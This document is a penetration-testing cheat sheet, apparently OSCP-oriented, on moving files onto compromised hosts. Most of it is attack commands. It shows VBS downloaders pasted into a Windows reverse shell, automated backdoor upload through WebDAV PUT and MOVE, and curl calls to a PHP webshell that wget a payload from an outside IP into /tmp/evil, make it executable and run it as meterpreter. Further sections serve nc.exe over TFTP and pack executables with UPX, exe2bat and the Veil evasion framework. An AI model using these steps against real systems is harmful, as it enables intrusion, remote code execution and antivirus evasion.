# File Transfers

## Simple Local Web Servers

- Run a basic http server, great for serving up shells etc

```ShellSession
python -m SimpleHTTPServer 80
```

- Run a basic Python3 http server, great for serving up shells etc

```ShellSession
python3 -m http.server
```

- Run a ruby webrick basic http server

```ShellSession
ruby -r webrick -e "s = WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd); trap('INT') { s.shutdown }; s.start"
```

- Run a basic PHP http server

```ShellSession
php -S $ip:80
```

- Creating a wget VB Script on Windows:

copy this script on a windows computer to install wget in visualbasic scripting language

dont forget to start the apache2 server attack

```ShellSession
service apache2 start
```

```ShellSession
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

to use simply type

```ShellSession
cscript wget.vbs http://192.168.14.220/evidence.txt evidence.txt
```

- Windows file transfer script that can be pasted to the command line.

File transfers to a Windows machine can be tricky without a Meterpreter shell.

The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):

```ShellSession
 echo Set args = Wscript.Arguments  >> webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  >> webdl.vbs
 timeout 1
 echo xHttp.Send  >> webdl.vbs
 timeout 1
 echo with bStrm      >> webdl.vbs
 timeout 1
 echo 	.type = 1 '      >> webdl.vbs
 timeout 1
 echo 	.open      >> webdl.vbs
 timeout 1
 echo 	.write xHttp.responseBody      >> webdl.vbs
 timeout 1
 echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
 timeout 1
 echo end with >> webdl.vbs
 timeout 1
 echo
```

The file can be run using the following syntax:

```ShellSession
C:\temp\cscript.exe webdl.vbs
```

Mounting File Shares

- Mount NFS share to /mnt/nfs

```ShellSession
mount $ip:/vol/share /mnt/nfs
```

- HTTP Put

```ShellSession
nmap -p80 $ip --script http-put --script-args
http-put.url='/test/sicpwn.php',http-put.file='/var/[www/html/sicpwn.php](http://www/html/sicpwn.php)
```

## Uploading Files

- SCP

```ShellSession
scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
scp localfile username@$ip:~/Folder/
scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
```

## Webdav with Davtest

Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor

```ShellSession
davtest -move -sendbd auto -url http://$ip

<https://github.com/cldrn/davtest>
```

- You can also upload a file using the PUT method with the curl command:

```ShellSession
curl -T 'leetshellz.txt' 'http://$ip'
```

And rename it to an executable file using the MOVE method with the curl command:

```ShellSession
curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'
```

- Upload shell using limited php shell cmd.

Use the webshell to download and execute the meterpreter

```ShellSession
[curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O /tmp/evil" http://$ip/files/sh.php
[curl -s --data "cmd=chmod 777 /tmp/evil" http://$ip/files/sh.php
curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php
```

- TFTP

```ShellSession
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
EX. FROM WINDOWS HOST:
C:\Users\Offsec>tftp -i $ip get nc.exe
```

- FTP

```ShellSession
apt-get update && apt-get install pure-ftpd

#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/

/etc/init.d/pure-ftpd restart
```

## Packing Files

- Ultimate Packer for eXecutables

```ShellSession
upx -9 nc.exe
```

- exe2bat - Converts EXE to a text file that can be copied and pasted

```ShellSession
locate exe2bat
wine exe2bat.exe nc.exe nc.txt
```

- Veil - Evasion Framework https://github.com/Veil-Framework/Veil-Evasion

```ShellSession
apt-get -y install git
git clone https://github.com/Veil-Framework/Veil-Evasion.git
cd Veil-Evasion/
cd setup
setup.sh -c
```
